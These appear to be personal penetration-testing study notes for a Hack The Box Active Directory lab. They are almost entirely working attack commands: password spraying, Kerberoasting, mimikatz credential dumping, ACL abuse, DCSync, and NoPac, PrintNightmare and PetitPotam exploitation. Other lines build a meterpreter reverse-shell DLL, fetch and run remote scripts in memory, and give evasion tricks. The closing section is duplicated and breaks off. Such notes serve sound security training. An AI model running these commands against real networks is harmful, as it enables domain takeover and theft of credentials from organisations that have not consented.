
Connection  
`xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!`  
`ssh htb-student@<ATTACK01 target IP>`  
`xfreerdp /v:<ATTACK01 target IP> /u:htb-student /p:HTB_@cademy_stdnt!`

### **In Scope For Assessment**

|**Range/Domain**|**Description**|
|---|---|
|`INLANEFREIGHT.LOCAL`|Customer domain to include AD and web services.|
|`LOGISTICS.INLANEFREIGHT.LOCAL`|Customer subdomain|
|`FREIGHTLOGISTICS.LOCAL`|Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL|
|`172.16.5.0/23`|In-scope internal subnet.|

### **Out Of Scope**

- `Any other subdomains of INLANEFREIGHT.LOCAL`
- `Any subdomains of FREIGHTLOGISTICS.LOCAL`
- `Any phishing or social engineering attacks`
- `Any other IPS/domains/subdomains not explicitly mentioned`
- `Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module`

### **Key Data Points**

|**Data Point**|**Description**|
|---|---|
|`AD Users`|We are trying to enumerate valid user accounts we can target for password spraying.|
|`AD Joined Computers`|Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.|
|`Key Services`|Kerberos, NetBIOS, LDAP, DNS|
|`Vulnerable Hosts and Services`|Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)|

## Initial Enumeration of the Domain

```python
sudo -E wireshark
sudo tcpdump -i ens224 
sudo responder -I ens224 -A 
fping -asgq 172.16.5.0/23
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

## DNS Dumping

## LLMNR/NBT-NS Poisoning

```python
# Linux
sudo responder -i ens224

# Window
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
"""
As we can see, the tool starts and shows which options are enabled by default and which 
are not. The options with a [+] are default and enabled by default and the ones with a 
[ ] before them are disabled. The running console output also shows us which options are
disabled and, therefore, responses are not being sent (mDNS in the above example). We can
also see the message Press ESC to enter/exit interactive console, which is very useful 
while running the tool. The console gives us access to captured credentials/hashes,allows 
us to stop Inveigh, and more.
"""
> Console CMDs
HELP
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES

```

## Enumerate Password Policy

```docker
**# Linux
rpcclient $> getdompwinfo

nxc smb 10.211.11.10 --pass-pol

enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA ilfreight

ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Windows
net accounts [Recommand]

net use \\DC01\ipc$ "" /u:""
net use \\DC01\ipc$ "" /u:guest
net use \\DC01\ipc$ "password" /u:guest

import-module .\PowerView.ps1
Get-DomainPolicy**
```

## Enumerate Users

```python
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N 172.16.5.5 [enumdomusers, queryuser, samlookupsids domain 1234]

crackmapexec smb 172.16.5.5 --users
nxc smb 10.0.27.69 -u '' -p '' --users | awk '{print $5}' | grep -Ev '^(Administrator|Guest|krbtgt|ATHENA|-Username-|$)' > users.txt
nxc smb 192.168.150.128 -u 'a' -p '' --rid-brute | grep -ia sidtypeuser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee /tmp/user.txt

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
ldapsearch -x -H ldap://192.168.150.128 -b "DC=simply,DC=cyber" '(objectclass=person)' | grep -ia samaccountname

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
./kerbrute userenum -d ILF.local --dc 10.129.140.96 nusers.txt 2>&1 | tee kerbrute_output.txt | awk '/VALID USERNAME:/ {print $NF}' > valid_users.txt

# RID Cycling
for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
```

## Password Spraying

```python
# Linux
# Bash one-liner
for u in **$**(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 --continue-on-success | grep +

# Local admin password spraying
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf --continue-on-success | grep +

# Windows
. .\[DomainPasswordSpray.ps1](<https://github.com/dafthack/DomainPasswordSpray>)
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile Spray-success -ErrorAction SilentlyContinue
```

## Enumerating Security Controls

```powershell
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode

<https://github.com/leoloobeek/LAPSToolkit>
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

## Credentials Enumeration Linux

```python
# Linux

sudo crackmapexec smb 172.16.5.5 -u abc -p passwd --users
sudo crackmapexec smb 172.16.5.5 -u abc -p passwd --groups
sudo crackmapexec smb 172.16.5.5 -u abc -p passwd --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

# Check Access
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

**rpcclient $> enumdomusers
rpcclient $>** samlookuprids domain 1634 # Find user with RID

**sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

"""
The tool creates a remote service by uploading a randomly-named executable to the 
ADMIN$ share on the target host. It then registers the service via RPC and the Windows 
Service Control Manager.
"""
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

"""
Wmiexec.py is a stealthy tool that runs commands via WMI without dropping files on the 
target, reducing logs and detection risk. It executes as a local admin user rather than 
SYSTEM, making activity less obvious. Though quieter than other tools, it’s still 
detectable by modern AV and EDR.
"""
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5**
```

## Credentials Enumeration Windows

```powershell
1. Active Directory Module
2. PowerView
3. SharpView
4. Snaffler (Credentials collector from shares on all machines in AD)
5. SharpHound

# List all loaded modules
Get-Module

Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *

Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"

Get-ADGroupMember -Identity "Backup Operators"

Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# Snaffler
<https://github.com/SnaffCon/Snaffler>
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

# SharpHound
.\SharpHound.exe -c All --zipfilename ILFREIGHT

# Mimikatz clear password fix
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
shutdown /r /t 0 /f
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Invoke-mimikatz.ps1
Invoke-Mimikatz -DumpCreds -Verbose
Invoke-Mimikatz -Command '"sekurlsa::pth /user:emp_svc /domain:cyberwarfare.corp /rc4:<hash> /run:powershell.exe"' -Verbose
```

## AsRepRoasting

```powershell
impacket-GetNPUsers fusion.corp/ -usersfile users.txt -no-pass -request

nxc ldap SYSCO.LOCAL -u users.txt -p '' --asreproast output.txt
```

**Power View**

|**Command**|**Description**|
|---|---|
|`Export-PowerViewCSV`|Append results to a CSV file|
|`ConvertTo-SID`|Convert a User or group name to its SID value|
|`Get-DomainSPNTicket`|Requests the Kerberos ticket for a specified Service Principal Name (SPN) account|
|**Domain/LDAP Functions:**||
|`Get-Domain`|Will return the AD object for the current (or specified) domain|
|`Get-DomainController`|Return a list of the Domain Controllers for the specified domain|
|`Get-DomainUser`|Will return all users or specific user objects in AD|
|`Get-DomainComputer`|Will return all computers or specific computer objects in AD|
|`Get-DomainGroup`|Will return all groups or specific group objects in AD|
|`Get-DomainOU`|Search for all or specific OU objects in AD|
|`Find-InterestingDomainAcl`|Finds object ACLs in the domain with modification rights set to non-built in objects|
|`Get-DomainGroupMember`|Will return the members of a specific domain group|
|`Get-DomainFileServer`|Returns a list of servers likely functioning as file servers|
|`Get-DomainDFSShare`|Returns a list of all distributed file systems for the current (or specified) domain|
|**GPO Functions:**||
|`Get-DomainGPO`|Will return all GPOs or specific GPO objects in AD|
|`Get-DomainPolicy`|Returns the default domain policy or the domain controller policy for the current domain|
|**Computer Enumeration Functions:**||
|`Get-NetLocalGroup`|Enumerates local groups on the local or a remote machine|
|`Get-NetLocalGroupMember`|Enumerates members of a specific local group|
|`Get-NetShare`|Returns open shares on the local (or a remote) machine|
|`Get-NetSession`|Will return session information for the local (or a remote) machine|
|`Test-AdminAccess`|Tests if the current user has administrative access to the local (or a remote) machine|
|**Threaded 'Meta'-Functions:**||
|`Find-DomainUserLocation`|Finds machines where specific users are logged in|
|`Find-DomainShare`|Finds reachable shares on domain machines|
|`Find-InterestingDomainShareFile`|Searches for files matching specific criteria on readable shares in the domain|
|`Find-LocalAdminAccess`|Find machines on the local domain where the current user has local administrator access|
|**Domain Trust Functions:**||
|`Get-DomainTrust`|Returns domain trusts for the current domain or a specified domain|
|`Get-ForestTrust`|Returns all forest trusts for the current forest or a specified forest|
|`Get-DomainForeignUser`|Enumerates users who are in groups outside of the user's domain|
|`Get-DomainForeignGroupMember`|Enumerates groups with users outside of the group's domain and returns each foreign member|
|`Get-DomainTrustMapping`|Will enumerate all trusts for the current domain and any others seen.|

## Living Off the Land

### **Basic Enumeration Commands**

|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|

|**Cmd-Let**|**Description**|
|---|---|
|`Get-Module`|Lists available modules loaded for use.|
|`Get-ExecutionPolicy -List`|Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.|
|`Set-ExecutionPolicy Bypass -Scope Process`|This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|
|`Get-ChildItem Env:|ft Key,Value`|
|`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.|
|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`|This is a quick and easy way to download a file from the web using PowerShell and call it from memory.|
|`Get-host`||
|`powershell.exe -version 2`|Downgrade powershell version|
|`netsh advfirewall show allprofiles`|Firewall checks|
|`sc query windefend`||
|`Get-MpComputerStatus`|Window Defender checks, if defender exists, we can run Get-MpcomputerStatus to look at config settings|
|`qwinsta`|Am I alone?|

### **Network Information**

|**Networking Commands**|**Description**|
|---|---|
|`arp -a`|Lists all known hosts stored in the arp table.|
|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|`netsh advfirewall show allprofiles`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|

### **Quick WMI checks**

[CheetSheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)

|**Command**|**Description**|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
|`wmic process list /format:list`|A listing of all processes on host|
|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
|`wmic group list /format:list`|Information about all local groups|
|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|

### **Table of Useful Net Commands**

Tricks - we can use net1 (fallback compatibility) to evade detection

|**Command**|**Description**|
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|

### Dsquery

|Part|Meaning|
|---|---|
|`userAccountControl`|This is the AD attribute that stores user status flags (like "account disabled", "password never expires", etc.). It’s a bitmask.|
|`1.2.840.113556.1.4.803`|This OID means **"exact bitwise match"**. It checks if a **specific bit** (8192 in this case) is set in the attribute.|
|`:=8192`|This is the **bit value** you're checking for. `8192` represents a specific flag (see below).|

Common OID Matching Rules:  
`1.2.840.113556.1.4.803` – Exact Match: Only matches if all bits match (e.g., find users with a specific attribute).

`1.2.840.113556.1.4.804` – Partial Bit Match: Matches if any bit in the value matches (used for multi-attribute checks).

`1.2.840.113556.1.4.1941` – Recursive DN Match: Searches group membership and ownership recursively.

⚙️ Logical Operators in Filters:  
& = AND

| = OR

! = NOT

```powershell
dsquery user
dsquery computer
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
dsquery * -filter "(&(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL))"
```

### UAC values

![image.png](attachment:4529e8ff-e00a-4d36-b2a6-9dd6b1c426ce:image.png)

## Kerberoasting

```python
# Linux
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

# Windows
setspn.exe -Q */*

# Requesting TGS in PowerShell
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Reteriving all tickets 
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Extracting tickets from memory with mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export

echo "<base64 blob>" |  tr -d \\n 
cat encoded_file | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
# Modifying crack file for hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

PowerView
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
# Target specific user
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
# Extracting all tickets(accounts) to csv file
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

Rubeus
.\Rubeus.exe kerberoast /stats # check kerberoastable users
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap # requesting high value account's ticket 
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap # /tgtdeleg means we want type 23 RC4/ downgrade from AES to RC4

```

## LDAP

```powershell
ldapsearch -x -h 172.16.7.3 -s base namingcontexts
# gather more informations like users,computers
ldapsearch -h 172.16.7.3 -x -s base -b '' "(objectClass=*)" "*" + 
ldapsearch -h 172.16.7.3 -x -b "DC=INLANEFREIGHT,DC=LOCAL" '(objectClass=Person)'

```

## ACL Abuse

```python
ForceChangePassword abused with Set-DomainUserPassword
Add Members abused with Add-DomainGroupMember
GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
GenericWrite abused with Set-DomainObject
WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Addself abused with Add-DomainGroupMember
```

![image.png](attachment:2c59f5bc-a562-4c31-a692-ef3318e245e0:image.png)

## ACL Enumeration

```powershell
Find-InterestingDomainAcl
# Targeted enumeartion
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
# Check DCSync Privilege
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose

# Reserve search to resolve GUIDs
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
# PowerView flag to resolve GUID
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Using Active Directory Module
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt # collecting all users
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

# Nested group enumeration
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

```

## ACL Attack Tatics

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`

[https://github.com/byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

```powershell
# Force Changed Password
# First create PS credential object
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 

# Create a SecureString Object for password that we want to set for our target
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
# Setting password using PowerView
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# Abusing GenericWrite by adding user to a group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
# Checking the group members
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# Generic All
# Creating a fake spn
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Cleanup
# Removing fake spn
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
# Removing user from group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
# Confirmed that the user is removed from group
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

## DCSync

```powershell
# Using Get-ObjectAcl to Check user's Replication Rights
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

# Finding users with reversible encryption
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
# Checking for Reversible Encryption Option using Get-DomainUser
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Linux
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

# Winodws
# Using runas in powershall with admin priv
runas /netonly /user:INLANEFREIGHT\adunn powershell

lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

```

## Remote Access (Privilege)

```powershell
# Use Powerview to get RDP members
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

# Finding WinRM (Remote Access) in BloodHound (cypher query)
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
# Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

# WinRM 
# PSSession from Window
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
# Linux
evil-winrm -i 10.129.201.234 -u forend

# SQL Admin Right
# Windows
<https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet>
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
# Linux
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

```

## Double Hop Problem

```powershell
# Evil-Winrm create credential object within the current session
get-domainuser -spn -credential **$**Cred | select samaccountname

# PSRemote Session
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
Restart-Service WinRM
```

## Bleeding edge vulnerabilities

```powershell
NoPac (SamAccountName Spoofing)
CVEs [2021-42278](<https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278>) and [2021-42287](<https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287>)
42278 is a bypass vulnerability with the Security Account Manager (SAM).	
42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.

# Scanning the vuln
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
# Noisy Gaining shell on DC (impersonate the built-in administrator account)
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
# DCSync with NoPac
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

Print Nightmare
(CVE-2021-34527 and [CVE-2021-1675](<https://github.com/cube0x0/CVE-2021-1675.git>)) found in the Print Spooler service

We may need to uninstall the version of Impacket on our attack host and install cube0x0's.
Install cube0x0's Version of Impacket
""
pip3 uninstall impacket
git clone <https://github.com/cube0x0/impacket>
cd impacket
python3 ./setup.py install
""

# We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'    
# Crafting dll payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
# Creating smbserver
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
# Configuring MSF multi handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
# Running the exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

PetitPotam (MS-EFSRPC)
# Starting ntlmrelay
sudo ntlmrelayx.py -debug -smb2support --target <http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp> --adcs --template DomainController
# run in another terminal
python3 PetitPotam.py <attack host IP> <Domain Controller IP>
# Catching Base64 Encoded Certificate for DC01
# Requesting TGT
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Getting NTLM hash from TGT ticket (Submitting a TGS Request for Ourselves Using getnthash.py)
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

# Requesting TGT using rubeus
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
lsadump::dcsync /user:inlanefreight\krbtgt
```

```powershell
NoPac (SamAccountName Spoofing)
CVEs [2021-42278](<https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278>) and [2021-42287](<https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287>)
42278 is a bypass vulnerability with the Security Account Manager (SAM).	
42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.

# Scanning the vuln
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
# Noisy Gaining shell on DC (impersonate the built-in administrator account)
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
# DCSync with NoPac
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

Print Nightmare
(CVE-2021-34527 and [CVE-2021-1675](<https://github.com/cube0x0/CVE-2021-1675.git>)) found in the Print Spooler service

We may need to uninstall the version of Impacket on our attack host and install cube0x0's.
Install cube0x0's Version of Impacket
""
pip3 uninstall impacket
git clone <https://github.com/cube0x0/impacket>
cd impacket
python3 ./setup.py install
""

# We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'    
# Crafting dll payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
# Creating smbserver
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
# Configuring MSF multi handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
# Running the exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

PetitPotam (MS-EFSRPC)
# Starting ntlmrelay
sudo ntlmrelayx.py -debug -smb2support --target <http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp> --adcs --template DomainController
# run in another terminal
python3 PetitPotam.py <attack host IP> <Domain Controller IP>
# Catching Base64 Encoded Certificate for DC01
# Requesting TGT
